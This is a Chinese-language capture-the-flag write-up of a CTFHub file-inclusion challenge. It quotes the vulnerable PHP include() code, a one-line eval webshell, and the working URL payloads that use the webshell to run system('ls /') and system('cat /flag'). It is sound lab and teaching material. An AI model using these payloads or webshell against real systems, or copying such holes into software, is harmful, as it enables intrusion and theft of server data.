【CTFHub】Web-RCE 文件包含 Writeup

操作者：何芊宏 | 操作日期：2026.9.26 | 分类：CTF | 标签：CTFHub, Web, RCE, 文件包含, 参数分离绕过

1. 题目信息

  • 平台：CTFHub
  • 分类：Web - RCE / 文件包含
  • 题目名称：文件包含
  • 环境：VS Code + 浏览器地址栏 (URL 编码)。
  • 目标：利用服务器未过滤的 include() 函数，结合自带的木马文件，通过参数分离技巧绕过 strpos 过滤，实现任意命令执行。

2. 解题思路与知识点

本关核心考点：文件包含漏洞的利用与多参数配合绕过过滤。

知识点（比喻说明）：
  • 文件包含（include）的本质：如果把服务器比作一家公司，include 就像是把外部文件“复印”过来当成公司内部指令执行。如果复印的是普通的文本（txt），它可能就只是一行字；如果复印的是木马（PHP），它就会作为代码被执行。
  • 参数分离战术：这关的过滤机制（安检员）只检查第一个包裹（file 参数）里有没有违禁品（flag）。我们采取“声东击西”的策略：包裹里只放无关紧要的木头（shell.txt），骗过安检；但进去之后，木马激活，我们再通过另一个隐藏通道（ctfhub 参数）把真正的武器递进去。
  • strpos 逻辑缺陷：源码使用 !strpos($_GET["file"], "flag")。strpos 查找字符串首次出现的位置，找不到返回 false，开头找到返回 0。!false 和 !0 均为 true，因此只要不含 "flag" 或 "flag" 在开头，都能通过检测。

3. 详细步骤

第一步：源码审计与漏洞定位

操作： 访问靶场 URL，查看页面回显的 PHP 源码。

<?php
error_reporting(0);
if (isset($_GET['file'])) {
    if (!strpos($_GET["file"], "flag")) {
        include $_GET["file"];
    } else {
        echo "Hacker!!!";
    }
} else {
    highlight_file(__FILE__);
}
?>
<hr>
i have a <a href="shell.txt">shell</a>, how to use it ?

代码逐行解析：

  • error_reporting(0);：关闭所有报错信息（这使得报错盲注变得困难，所以我们要严格遵循语法）。
  • if (isset($_GET['file'])) { ... }：接收 URL 中的 `file` 参数。
  • if (!strpos($_GET["file"], "flag"))：检查 `file` 参数的值是否包含 "flag"。如果没有，`strpos` 返回 false，`!false` 为 true，进入下一行。
  • include $_GET["file"];：核心漏洞点，将 `file` 指定的文件当作代码包含并执行。
  • else { echo "Hacker!!!"; }：如果 `file` 参数包含 "flag" 字符串，则拦截。
  • 页面底部的超链接：明确提示存在一个名为 `shell.txt` 的文件，这就是我们破局的钥匙。

获得信息：存在包含漏洞，过滤逻辑为参数分离战术提供了可乘之机。

第二步：分析木马文件 shell.txt

操作： 在浏览器直接访问 /shell.txt。

<?php eval($_REQUEST['ctfhub']);?>

代码逐行解析：

  • eval()：PHP 代码执行函数。
  • $_REQUEST['ctfhub']：接收 GET 或 POST 请求中名为 `ctfhub` 的参数值。

获得信息：这是一个完美的“一句话木马”。只要包含它，我们就可以通过 `?ctfhub=...` 传入任意 PHP 代码执行。

第三步：包含木马并测试连通性

Payload： ?file=shell.txt&ctfhub=phpinfo();

为什么要输入：利用 ?file=shell.txt 成功包含木马（因为 `shell.txt` 里没有 "flag" 字符串，完美绕过检测），同时利用 &ctfhub=phpinfo(); 激活木马，执行探针函数。

回显结果：页面成功渲染出紫色的 phpinfo 页面。

获得信息：确认木马执行成功，PHP 5.6.40 环境。

第四步：执行系统命令寻找 Flag

Payload： ?file=shell.txt&ctfhub=system('ls /');

URL编码版： ?file=shell.txt&ctfhub=system(%27ls%20/%27);

为什么要输入：调用 system 函数执行 Linux 命令列出根目录，寻找 flag 文件。此时 `file` 参数依旧是安全的 `shell.txt`，过滤机制形同虚设。

回显结果：列出了根目录，发现目标文件 /flag。

获得信息：确定目标 Flag 文件的绝对路径。

第五步：读取 Flag 并提交

Payload： ?file=shell.txt&ctfhub=system('cat /flag');

URL编码版： ?file=shell.txt&ctfhub=system(%27cat%20/flag%27);

为什么要输入：借助木马，调用 system 命令读取文件内容。

回显结果：ctfhub{b780b23000d16d124addfaa0}

获得信息：成功获取 Flag，提交通关。

4. 踩坑记录与复盘

  • 坑1：`strpos` 的拦截。 第一反应想直接包含 `/flag`，但 `file=flag` 会被过滤。复盘：遇到过滤不能死磕一个参数，要寻找代码中其他可控的变量（如本题中的 `ctfhub`）进行旁路传递。
  • 坑2：URL 转义问题。 浏览器有时会转义单引号和空格，沿用上一关的习惯，使用 URL 编码 `%27`（单引号）和 `%20`（空格）完美解决。

5. 知识总结

  • 参数分离战术（旁路攻击）： 利用多参数传递，一个参数（file）用于骗取服务器的信任，另一个参数（ctfhub）用于执行真正的攻击载荷。
  • 文件包含的威力： 只要目标文件包含成功，里面的 PHP 代码就会被服务器执行，配合一句话木马即可获取极高的控制权限。
  • 读文件命令复习： 先 `ls /` 探路，后 `cat /flag` 读取。
